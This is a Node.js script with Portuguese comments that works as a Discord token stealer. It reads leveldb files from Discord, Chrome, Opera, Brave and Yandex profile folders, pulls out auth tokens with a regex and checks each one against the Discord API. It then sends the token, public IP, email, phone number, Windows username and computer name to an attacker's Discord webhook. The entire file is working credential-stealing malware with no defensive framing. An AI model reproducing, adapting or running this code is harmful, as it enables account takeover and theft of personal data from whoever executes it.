//npm i sync-request

const id = `o id do seu webhook`
const tokencoisado = `o token do seu webhook`

const localappdata = process.env.LOCALAPPDATA;
const appdata = process.env.APPDATA;
const fs = require(`fs`)
const request = require(`sync-request`)
const {WebhookClient, MessageEmbed} = require(`discord.js`)

const hook = new WebhookClient(id, tokencoisado)

var loc = {
    'Discord': appdata + '\\Discord',
    'Discord Canary': appdata + "\\discordcanary",
    'Discord PTB': appdata + "\\discordptb",
    'Google Chrome': localappdata + "\\Google\\Chrome\\User Data\\Default",
    'Opera': appdata + "\\Opera Software\\Opera Stable",
    'Brave': localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default" //n sei quem usaria yandex mas ta ai
}
var devdd = []
for(const a in loc){
    if(fs.existsSync(loc[a])) devdd.push(loc[a])
}

var tokens = []

for(let b of devdd){ //aqui é onde o treco de pegar token acontece
    b += `\\Local Storage\\leveldb`
    const files = fs.readdirSync(b).filter(file => file.endsWith(`.ldb`))
    for(const c in files){
        const file = fs.readFileSync(b + `\\` + files[c]).toString()
        var token = file.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gmi) //regex de token
        if(token == null) continue;
        for(const kahdgfsd of token) tokens.push(kahdgfsd)
    }
}

for(const a of tokens){
    var validtoken = request('GET', 'https://discordapp.com/api/v6/users/@me', {
        headers: {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
            "Authorization": a
        }
    })
    if(validtoken.statusCode !== 200) continue;
    var conta = JSON.parse(validtoken.getBody())
    let coisocoisadofoda = new MessageEmbed()
    .setTitle(conta['username']+`#`+conta['discriminator'])
    .setImage(`https://cdn.discordapp.com/avatars/${conta['id']}/${conta['avatar']}`)
    .addFields(
        {name: 'Token', value: a},
        {name: 'IP', value: request(`GET`, `https://api.ipify.org`).getBody()},
        {name: 'Email', value: conta['email'], inline: true},
        {name: 'Telefone', value: conta['phone'] !== null ? conta['phone'] : 'Nenhum', inline: true},
        {name: 'Username no pc', value: process.env.USERNAME, inline: true},
        {name: 'Nome do pc', value: process.env.COMPUTERNAME}
    )
    .setColor('#FF0000')
    .setFooter('© paradino produções 2021 não copiar se não eu dou um tapa na sua bunda')
    hook.send(coisocoisadofoda)
}
